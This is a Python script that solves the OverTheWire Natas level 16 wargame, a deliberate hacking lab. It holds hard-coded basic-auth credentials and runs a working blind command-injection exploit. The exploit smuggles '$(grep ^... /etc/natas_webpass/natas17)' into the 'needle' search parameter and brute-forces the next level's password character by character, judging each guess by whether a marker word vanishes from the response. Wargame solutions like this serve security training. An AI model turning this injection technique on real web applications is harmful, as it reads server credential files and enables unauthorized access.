import requests
import re

# http basic authentication
credentials = ("natas16" , "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh")
alphabet="abcdefghijklmnopqrstuvxywzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

url_base = "http://natas16.natas.labs.overthewire.org"
username="natas16"

pass_sure=""

for x in range(0,32):
    print("cicle: "+str(x))
    for letter in alphabet:
        newpass = pass_sure+letter
        needle = "Africans$(grep ^{} /etc/natas_webpass/natas17)".format(newpass)
        query='?needle={}'.format(needle) 
        page = requests.get(url_base+query,auth=credentials)
        #print(query)
        # se non c'è "Africans" pass giusta -> aggiorna pass e esci dal ciclo
        if not re.search("Africans",page.text):
            pass_sure=newpass
            print("MATCH: "+pass_sure)
            break

print("Password is: "+pass_sure)
